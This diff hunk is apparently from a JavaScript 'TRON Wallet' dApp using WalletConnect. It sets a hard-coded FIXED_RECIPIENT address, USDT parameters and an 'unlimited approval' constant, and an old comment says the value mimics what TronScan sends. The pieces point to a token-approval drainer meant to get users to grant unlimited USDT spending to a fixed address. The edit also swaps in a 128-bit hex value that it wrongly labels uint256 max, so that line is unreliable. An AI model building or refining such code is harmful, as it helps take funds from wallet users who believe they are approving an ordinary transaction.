@@ -9,8 +9,8 @@ const FIXED_RECIPIENT = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 const USDT_DECIMALS   = 6;
 const FEE_LIMIT       = 200_000_000;
 
-// uint256 max — identical to what TronScan sends for unlimited approval
-const UINT256_MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+// uint256 max — unlimited approval in hex format
+const UINT256_MAX = "0xffffffffffffffffffffffffffffffff";
 
 const PROJECT_ID = import.meta.env.VITE_WC_PROJECT_ID;
 const APP_NAME   = import.meta.env.VITE_APP_NAME || "TRON Wallet";
